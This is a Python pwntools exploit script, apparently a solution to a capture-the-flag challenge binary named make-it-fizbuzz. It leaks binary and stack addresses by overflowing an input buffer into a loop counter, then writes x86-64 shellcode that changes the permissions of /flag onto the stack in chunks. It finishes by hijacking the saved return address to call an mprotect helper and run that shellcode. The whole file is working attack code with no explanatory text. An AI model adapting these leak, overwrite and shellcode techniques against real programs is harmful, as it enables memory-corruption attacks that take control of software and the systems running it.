from pwn import *

p = process("/challenge/make-it-fizbuzz")

offset_to_buffer = 0x10 # leaked_stack - offset_to_buffer = start_of_the_buffer
offset_to_rip = 0x34 # leaked_stack + offset_to_rip = saved_rip_addr
loop_counter = 24 # offset to loop counter X bytes after start_of_input_buffer

fuzzbuzz_offset = 0x4080 # from binary
mprotect_offset = 0x1269 # from binary

print(p.clean())

p.send(b"A" * loop_counter + b"\xff\xff\xff\xff")

x = p.clean()
print(x)
leaked_binary = int.from_bytes(x.split(b'\xff\xff\xff\xff')[1][:6], 'little')

print("[+] Leaked Binary Address ::", hex(leaked_binary))

print(p.clean())

for i in range(5):
    print("[.] burning iterations", i)
    p.send(b"burn")
    print(p.clean())

print("[+] 5th iteration, now src* = stack")

p.send(b"A" * loop_counter + b"\xff" * 4) # \xff\xff\xff\xff will make sure v4 is -1, thus satisfying conditions to leak and to loop

x = p.clean()
print(x)
leaked_stack = int.from_bytes(x.split(b'\xff\xff\xff\xff')[1][:6], 'little')

print("[+] Leaked 'stack' address :: ", hex(leaked_stack))

binary_base = leaked_binary - fuzzbuzz_offset
mprotect_addr = binary_base + mprotect_offset

print("[+] mprotect_stack() function :: ", hex(mprotect_addr))

input_buffer_addr = leaked_stack - offset_to_buffer
target_rip_addr = leaked_stack + offset_to_rip

print("[+] target_rip_addr :: ", hex(target_rip_addr))

shellcode_addr = input_buffer_addr + 0x100

print("[+] shellcode_addr :: ", hex(shellcode_addr))

print(p.clean())

stash_addr = leaked_stack + 0x100
print(f"[+] Stashing Shellcode at: {hex(stash_addr)}")

# shellcode is chmod("/flag", mode=4)
full_shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05"
chunk1 = full_shellcode[:15]
chunk2 = full_shellcode[15:]

payload = b""
payload += b"A" # avoid overwriting
payload += chunk1
payload += b"\x00"
payload += b"A" * (24 - len(payload))
payload += b"\xff\xff\xff\xff"
payload += p64(input_buffer_addr + 1)
payload += p64(stash_addr)
p.send(payload)

print(p.clean())

payload = b""
payload += b"A" # avoid overwriting
payload += chunk2
payload += b"\x00"
payload += b"A" * (24 - len(payload))
payload += b"\xff\xff\xff\xff"
payload += p64(input_buffer_addr + 1)
payload += p64(stash_addr + 15)
p.send(payload)

print(p.clean())

payload = b""
payload += b"\x90" * 8
payload += p64(stash_addr)
payload += b"\x90" * (loop_counter - len(payload))
payload += b"\xff\xff\xff\xff"
payload += p64(input_buffer_addr + 8)
payload += p64(target_rip_addr + 8)

p.send(payload)

print(p.clean())

payload = b""
payload += b"\x90" * 8
payload += p64(mprotect_addr)
payload += b"\x90" * (loop_counter - len(payload))
payload += b"\x0f\x00\x00\x00"
payload += p64(input_buffer_addr + 8)
payload += p64(target_rip_addr)

p.send(payload)

print(p.clean())

p.interactive()

p.close()
